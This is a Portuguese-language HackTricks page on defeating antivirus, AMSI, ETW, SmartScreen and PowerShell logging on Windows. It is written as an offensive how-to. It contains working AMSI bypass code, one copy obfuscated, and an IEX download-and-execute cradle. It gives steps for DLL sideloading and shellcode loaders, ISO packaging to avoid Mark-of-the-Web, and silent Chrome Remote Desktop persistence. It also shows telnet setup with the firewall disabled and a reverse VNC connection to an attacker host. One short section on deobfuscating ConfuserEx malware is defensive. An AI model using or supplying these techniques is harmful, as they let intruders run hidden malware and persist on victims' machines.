# Bypass de Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para parar o Windows Defender de funcionar.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para parar o Windows Defender de funcionar fingindo ser outro AV.
- [Desabilitar o Defender se você for administrador](basic-powershell-for-pentesters/README.md)

## **Metodologia de Evasão de AV**

Atualmente, os AVs usam diferentes métodos para verificar se um arquivo é malicioso ou não, detecção estática, análise dinâmica e, para os EDRs mais avançados, análise comportamental.

### **Detecção estática**

A detecção estática é alcançada sinalizando strings ou arrays de bytes maliciosos conhecidos em um binário ou script, e também extraindo informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum, etc.). Isso significa que usar ferramentas públicas conhecidas pode fazer com que você seja pego mais facilmente, pois provavelmente foram analisadas e sinalizadas como maliciosas. Existem algumas maneiras de contornar esse tipo de detecção:

- **Criptografia**

Se você criptografar o binário, não haverá como o AV detectar seu programa, mas você precisará de algum tipo de carregador para descriptografar e executar o programa na memória.

- **Ofuscação**

Às vezes, tudo o que você precisa fazer é mudar algumas strings no seu binário ou script para passar pelo AV, mas isso pode ser uma tarefa que consome tempo, dependendo do que você está tentando ofuscar.

- **Ferramentas personalizadas**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas ruins conhecidas, mas isso leva muito tempo e esforço.

> [!TIP]
> Uma boa maneira de verificar a detecção estática do Windows Defender é [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele basicamente divide o arquivo em vários segmentos e, em seguida, pede ao Defender para escanear cada um individualmente, dessa forma, pode te dizer exatamente quais são as strings ou bytes sinalizados no seu binário.

Eu recomendo fortemente que você confira esta [playlist do YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre Evasão prática de AV.

### **Análise dinâmica**

A análise dinâmica é quando o AV executa seu binário em um sandbox e observa atividades maliciosas (por exemplo, tentando descriptografar e ler as senhas do seu navegador, realizando um minidump no LSASS, etc.). Esta parte pode ser um pouco mais complicada de trabalhar, mas aqui estão algumas coisas que você pode fazer para evadir sandboxes.

- **Dormir antes da execução** Dependendo de como é implementado, pode ser uma ótima maneira de contornar a análise dinâmica do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo de trabalho do usuário, então usar longas pausas pode perturbar a análise de binários. O problema é que muitos sandboxes de AV podem simplesmente ignorar a pausa, dependendo de como é implementado.
- **Verificando os recursos da máquina** Normalmente, os Sandboxes têm muito poucos recursos para trabalhar (por exemplo, < 2GB de RAM), caso contrário, poderiam desacelerar a máquina do usuário. Você também pode ser muito criativo aqui, por exemplo, verificando a temperatura da CPU ou até mesmo as velocidades do ventilador, nem tudo será implementado no sandbox.
- **Verificações específicas da máquina** Se você quiser direcionar um usuário cuja estação de trabalho está unida ao domínio "contoso.local", você pode fazer uma verificação no domínio do computador para ver se corresponde ao que você especificou, se não corresponder, você pode fazer seu programa sair.

Acontece que o nome do computador do Sandbox do Microsoft Defender é HAL9TH, então, você pode verificar o nome do computador no seu malware antes da detonação, se o nome corresponder a HAL9TH, significa que você está dentro do sandbox do defender, então você pode fazer seu programa sair.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas realmente boas de [@mgeeky](https://twitter.com/mariuszbit) para ir contra Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como dissemos antes neste post, **ferramentas públicas** eventualmente **serão detectadas**, então, você deve se perguntar algo:

Por exemplo, se você quiser despejar o LSASS, **você realmente precisa usar mimikatz**? Ou poderia usar um projeto diferente que é menos conhecido e também despeja o LSASS.

A resposta certa é provavelmente a última. Tomando mimikatz como exemplo, é provavelmente uma das, se não a peça de malware mais sinalizada por AVs e EDRs, enquanto o projeto em si é super legal, também é um pesadelo trabalhar com ele para contornar os AVs, então apenas procure alternativas para o que você está tentando alcançar.

> [!TIP]
> Ao modificar seus payloads para evasão, certifique-se de **desativar a submissão automática de amostras** no defender, e por favor, sério, **NÃO CARREGUE NO VIRUSTOTAL** se seu objetivo é alcançar evasão a longo prazo. Se você quiser verificar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar a submissão automática de amostras e teste lá até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, sempre **priorize o uso de DLLs para evasão**, na minha experiência, arquivos DLL são geralmente **muito menos detectados** e analisados, então é um truque muito simples de usar para evitar a detecção em alguns casos (se seu payload tiver alguma maneira de ser executado como uma DLL, é claro).

Como podemos ver nesta imagem, um Payload DLL do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem uma taxa de detecção de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação do antiscan.me de um payload EXE normal do Havoc vs um DLL normal do Havoc</p></figcaption></figure>

Agora vamos mostrar alguns truques que você pode usar com arquivos DLL para ser muito mais furtivo.

## Carregamento e Proxy de DLL

**Carregamento de DLL** aproveita a ordem de busca de DLL usada pelo carregador, posicionando tanto o aplicativo da vítima quanto o(s) payload(s) malicioso(s) lado a lado.

Você pode verificar programas suscetíveis ao Carregamento de DLL usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte script powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando irá gerar a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Eu recomendo fortemente que você **explore programas DLL Hijackable/Sideloadable por conta própria**, essa técnica é bastante furtiva quando feita corretamente, mas se você usar programas DLL Sideloadable publicamente conhecidos, pode ser facilmente pego.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não carregará sua carga útil, pois o programa espera algumas funções específicas dentro dessa DLL. Para resolver esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (e maliciosa) para a DLL original, preservando assim a funcionalidade do programa e sendo capaz de lidar com a execução da sua carga útil.

Eu estarei usando o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) do [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que eu segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: um modelo de código-fonte DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto a DLL proxy têm uma taxa de Detecção de 0/26 em [antiscan.me](https://antiscan.me)! Eu chamaria isso de um sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eu **recomendo fortemente** que você assista ao [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também ao [vídeo do ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais sobre o que discutimos de forma mais aprofundada.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze é um kit de ferramentas de payload para contornar EDRs usando processos suspensos, syscalls diretas e métodos de execução alternativos`

Você pode usar o Freeze para carregar e executar seu shellcode de maneira furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> A evasão é apenas um jogo de gato e rato, o que funciona hoje pode ser detectado amanhã, então nunca confie em apenas uma ferramenta, se possível, tente encadear várias técnicas de evasão.

## AMSI (Interface de Varredura Anti-Malware)

AMSI foi criado para prevenir "[malware sem arquivo](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs eram capazes de escanear **arquivos no disco**, então, se você conseguisse executar payloads **diretamente na memória**, o AV não poderia fazer nada para impedir, pois não tinha visibilidade suficiente.

O recurso AMSI está integrado nesses componentes do Windows.

- Controle de Conta de Usuário, ou UAC (elevação de EXE, COM, MSI ou instalação ActiveX)
- PowerShell (scripts, uso interativo e avaliação de código dinâmico)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macros VBA do Office

Ele permite que soluções antivírus inspecionem o comportamento de scripts, expondo o conteúdo do script de uma forma que é tanto não criptografada quanto não ofuscada.

Executar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produzirá o seguinte alerta no Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Note como ele adiciona `amsi:` e então o caminho para o executável a partir do qual o script foi executado, neste caso, powershell.exe

Não deixamos nenhum arquivo no disco, mas ainda assim fomos pegos na memória por causa do AMSI.

Além disso, a partir do **.NET 4.8**, o código C# também é executado através do AMSI. Isso até afeta `Assembly.Load(byte[])` para execução na memória. É por isso que usar versões mais antigas do .NET (como 4.7.2 ou inferior) é recomendado para execução na memória se você quiser evadir o AMSI.

Existem algumas maneiras de contornar o AMSI:

- **Ofuscação**

Como o AMSI funciona principalmente com detecções estáticas, portanto, modificar os scripts que você tenta carregar pode ser uma boa maneira de evadir a detecção.

No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que tenha várias camadas, então a ofuscação pode ser uma má opção dependendo de como é feita. Isso torna não tão simples a evasão. Embora, às vezes, tudo o que você precisa fazer é mudar alguns nomes de variáveis e você estará bem, então depende de quanto algo foi sinalizado.

- **Evasão do AMSI**

Como o AMSI é implementado carregando uma DLL no processo do powershell (também cscript.exe, wscript.exe, etc.), é possível manipulá-lo facilmente mesmo executando como um usuário não privilegiado. Devido a essa falha na implementação do AMSI, pesquisadores encontraram várias maneiras de evadir a varredura do AMSI.

**Forçando um Erro**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) resultará em que nenhuma varredura será iniciada para o processo atual. Originalmente, isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para prevenir o uso mais amplo.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bastou uma linha de código PowerShell para tornar o AMSI inutilizável para o processo PowerShell atual. Esta linha, é claro, foi sinalizada pelo próprio AMSI, então algumas modificações são necessárias para usar esta técnica.

Aqui está um bypass de AMSI modificado que eu peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Mantenha em mente que isso provavelmente será sinalizado assim que esta postagem for publicada, então você não deve publicar nenhum código se seu plano é permanecer indetectável.

**Memory Patching**

Esta técnica foi inicialmente descoberta por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê-lo com instruções para retornar o código para E_INVALIDARG, dessa forma, o resultado da varredura real retornará 0, que é interpretado como um resultado limpo.

> [!TIP]
> Por favor, leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.

Existem também muitas outras técnicas usadas para contornar o AMSI com PowerShell, confira [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**este repositório**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender mais sobre elas.

Esta ferramenta [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) também gera scripts para contornar o AMSI.

**Remover a assinatura detectada**

Você pode usar uma ferramenta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a assinatura AMSI detectada da memória do processo atual. Esta ferramenta funciona escaneando a memória do processo atual em busca da assinatura AMSI e, em seguida, sobrescrevendo-a com instruções NOP, efetivamente removendo-a da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use a versão 2 do PowerShell**
Se você usar a versão 2 do PowerShell, o AMSI não será carregado, então você pode executar seus scripts sem ser escaneado pelo AMSI. Você pode fazer isso:
```bash
powershell.exe -version 2
```
## PS Logging

O registro do PowerShell é um recurso que permite registrar todos os comandos do PowerShell executados em um sistema. Isso pode ser útil para fins de auditoria e solução de problemas, mas também pode ser um **problema para atacantes que desejam evitar a detecção**.

Para contornar o registro do PowerShell, você pode usar as seguintes técnicas:

- **Desativar a Transcrição do PowerShell e o Registro de Módulos**: Você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse propósito.
- **Usar a versão 2 do PowerShell**: Se você usar a versão 2 do PowerShell, o AMSI não será carregado, então você pode executar seus scripts sem ser escaneado pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Usar uma Sessão do PowerShell Não Gerenciada**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para iniciar um PowerShell sem defesas (isso é o que o `powerpick` do Cobalt Strike usa).

## Obfuscation

> [!TIP]
> Várias técnicas de ofuscação dependem da criptografia de dados, o que aumentará a entropia do binário, tornando mais fácil para AVs e EDRs detectá-lo. Tenha cuidado com isso e talvez aplique criptografia apenas a seções específicas do seu código que são sensíveis ou precisam ser ocultadas.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Ao analisar malware que usa ConfuserEx 2 (ou forks comerciais), é comum enfrentar várias camadas de proteção que bloquearão decompiladores e sandboxes. O fluxo de trabalho abaixo restaura de forma confiável um **IL quase original** que pode ser posteriormente decompilado para C# em ferramentas como dnSpy ou ILSpy.

1.  Remoção de anti-tampering – O ConfuserEx criptografa cada *corpo de método* e o descriptografa dentro do *construtor* estático do *módulo* (`<Module>.cctor`). Isso também corrige a soma de verificação PE, então qualquer modificação fará o binário travar. Use **AntiTamperKiller** para localizar as tabelas de metadados criptografadas, recuperar as chaves XOR e reescrever um assembly limpo:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
A saída contém os 6 parâmetros anti-tampering (`key0-key3`, `nameHash`, `internKey`) que podem ser úteis ao construir seu próprio descompactador.

2.  Recuperação de símbolos / fluxo de controle – forneça o arquivo *limpo* para **de4dot-cex** (um fork do de4dot ciente do ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – selecione o perfil do ConfuserEx 2
• o de4dot desfará a achatamento do fluxo de controle, restaurará namespaces, classes e nomes de variáveis originais e descriptografará strings constantes.

3.  Remoção de chamadas proxy – O ConfuserEx substitui chamadas diretas de métodos por wrappers leves (também conhecidos como *chamadas proxy*) para dificultar ainda mais a decompilação. Remova-os com **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Após esta etapa, você deve observar APIs normais do .NET, como `Convert.FromBase64String` ou `AES.Create()` em vez de funções de wrapper opacas (`Class8.smethod_10`, …).

4.  Limpeza manual – execute o binário resultante no dnSpy, procure grandes blobs Base64 ou uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar a carga *real*. Muitas vezes, o malware a armazena como um array de bytes codificado em TLV inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o fluxo de execução **sem** precisar executar a amostra maliciosa – útil ao trabalhar em uma estação de trabalho offline.

> 🛈  O ConfuserEx produz um atributo personalizado chamado `ConfusedByAttribute` que pode ser usado como um IOC para triagem automática de amostras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork de código aberto da suíte de compilação [LLVM](http://www.llvm.org/) capaz de fornecer maior segurança de software através da [ofuscação de código](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e proteção contra adulteração.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, código ofuscado sem usar nenhuma ferramenta externa e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações ofuscadas geradas pelo framework de metaprogramação de templates C++ que tornará a vida da pessoa que deseja quebrar a aplicação um pouco mais difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador binário x64 que é capaz de ofuscar vários arquivos pe diferentes, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um simples motor de código metamórfico para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código de grão fino para linguagens suportadas pelo LLVM usando ROP (programação orientada a retorno). ROPfuscator ofusca um programa no nível de código de montagem transformando instruções regulares em cadeias ROP, frustrando nossa concepção natural de fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um Crypter PE .NET escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e, em seguida, carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

O Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicativos potencialmente maliciosos.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

O SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicativos baixados incomumente acionarão o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em Mais Informações -> Executar assim mesmo).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) com o nome de Zone.Identifier que é criado automaticamente ao baixar arquivos da internet, junto com a URL de onde foi baixado.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier para um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante notar que executáveis assinados com um certificado de assinatura **confiável** **não acionarão o SmartScreen**.

Uma maneira muito eficaz de evitar que seus payloads recebam o Mark of The Web é embalá-los dentro de algum tipo de contêiner, como um ISO. Isso acontece porque o Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **não NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evadir o Mark-of-the-Web.

Exemplo de uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aqui está uma demonstração para contornar o SmartScreen empacotando cargas úteis dentro de arquivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de registro no Windows que permite que aplicativos e componentes do sistema **registrem eventos**. No entanto, também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

Semelhante a como o AMSI é desativado (contornado), também é possível fazer com que a função **`EtwEventWrite`** do processo de espaço do usuário retorne imediatamente sem registrar nenhum evento. Isso é feito patchando a função na memória para retornar imediatamente, efetivamente desativando o registro ETW para esse processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.

## Reflexão de Assembly C#

Carregar binários C# na memória é conhecido há bastante tempo e ainda é uma ótima maneira de executar suas ferramentas de pós-exploração sem ser pego pelo AV.

Como a carga útil será carregada diretamente na memória sem tocar no disco, teremos que nos preocupar apenas em patchar o AMSI para todo o processo.

A maioria das estruturas C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) já fornece a capacidade de executar assemblies C# diretamente na memória, mas existem diferentes maneiras de fazer isso:

- **Fork\&Run**

Envolve **gerar um novo processo sacrificial**, injetar seu código malicioso de pós-exploração nesse novo processo, executar seu código malicioso e, quando terminar, matar o novo processo. Isso tem seus benefícios e desvantagens. O benefício do método fork and run é que a execução ocorre **fora** do nosso processo de implante Beacon. Isso significa que, se algo em nossa ação de pós-exploração der errado ou for pego, há uma **chance muito maior** de nosso **implante sobreviver.** A desvantagem é que você tem uma **maior chance** de ser pego por **Detecções Comportamentais**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de pós-exploração **em seu próprio processo**. Dessa forma, você pode evitar ter que criar um novo processo e ser escaneado pelo AV, mas a desvantagem é que, se algo der errado com a execução de sua carga útil, há uma **chance muito maior** de **perder seu beacon**, pois ele pode travar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se você quiser ler mais sobre o carregamento de Assembly C#, consulte este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e seu BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar Assemblies C# **do PowerShell**, confira [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e [o vídeo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Usando Outras Linguagens de Programação

Como proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens, dando à máquina comprometida acesso **ao ambiente do interpretador instalado no compartilhamento SMB controlado pelo Atacante**.

Ao permitir acesso aos Binários do Interpretador e ao ambiente no compartilhamento SMB, você pode **executar código arbitrário nessas linguagens dentro da memória** da máquina comprometida.

O repositório indica: O Defender ainda escaneia os scripts, mas ao utilizar Go, Java, PHP, etc., temos **mais flexibilidade para contornar assinaturas estáticas**. Testes com scripts de shell reverso não ofuscados aleatórios nessas linguagens mostraram-se bem-sucedidos.

## TokenStomping

Token stomping é uma técnica que permite a um atacante **manipular o token de acesso ou um produto de segurança como um EDR ou AV**, permitindo que eles reduzam seus privilégios para que o processo não morra, mas não tenha permissões para verificar atividades maliciosas.

Para prevenir isso, o Windows poderia **impedir processos externos** de obter handles sobre os tokens de processos de segurança.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Usando Software Confiável

### Chrome Remote Desktop

Como descrito em [**este post do blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é fácil apenas implantar o Chrome Remote Desktop no PC da vítima e depois usá-lo para assumir o controle e manter a persistência:
1. Baixe de https://remotedesktop.google.com/, clique em "Configurar via SSH" e depois clique no arquivo MSI para Windows para baixar o arquivo MSI.
2. Execute o instalador silenciosamente na vítima (admin necessário): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volte para a página do Chrome Remote Desktop e clique em próximo. O assistente então pedirá que você autorize; clique no botão Autorizar para continuar.
4. Execute o parâmetro fornecido com alguns ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note o parâmetro pin que permite definir o pin sem usar a GUI).

## Evasão Avançada

Evasão é um tópico muito complicado, às vezes você tem que levar em conta muitas fontes diferentes de telemetria em apenas um sistema, então é praticamente impossível permanecer completamente indetectado em ambientes maduros.

Cada ambiente contra o qual você vai terá seus próprios pontos fortes e fracos.

Eu recomendo fortemente que você assista a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94), para ter uma noção de técnicas de Evasão Avançadas.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta também é outra ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasão em Profundidade.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Técnicas Antigas**

### **Verifique quais partes o Defender considera maliciosas**

Você pode usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **removerá partes do binário** até que **descubra qual parte o Defender** está considerando maliciosa e dividirá para você.\
Outra ferramenta que faz **a mesma coisa é** [**avred**](https://github.com/dobin/avred) com um site aberto oferecendo o serviço em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Servidor Telnet**

Até o Windows 10, todos os Windows vinham com um **servidor Telnet** que você poderia instalar (como administrador) fazendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que **inicie** quando o sistema for iniciado e **execute** agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Mudar a porta do telnet** (stealth) e desativar o firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Baixe-o de: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads binários, não a instalação)

**NO HOST**: Execute _**winvnc.exe**_ e configure o servidor:

- Ative a opção _Disable TrayIcon_
- Defina uma senha em _VNC Password_
- Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **recém** criado _**UltraVNC.ini**_ para dentro da **vítima**

#### **Conexão reversa**

O **atacante** deve **executar dentro** de seu **host** o binário `vncviewer.exe -listen 5900` para que esteja **preparado** para capturar uma **conexão VNC** reversa. Então, dentro da **vítima**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVISO:** Para manter a furtividade, você não deve fazer algumas coisas

- Não inicie `winvnc` se já estiver em execução ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). verifique se está em execução com `tasklist | findstr winvnc`
- Não inicie `winvnc` sem `UltraVNC.ini` no mesmo diretório ou isso fará com que a [janela de configuração](https://i.imgur.com/rfMQWcf.png) seja aberta
- Não execute `winvnc -h` para ajuda ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Baixe-o de: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
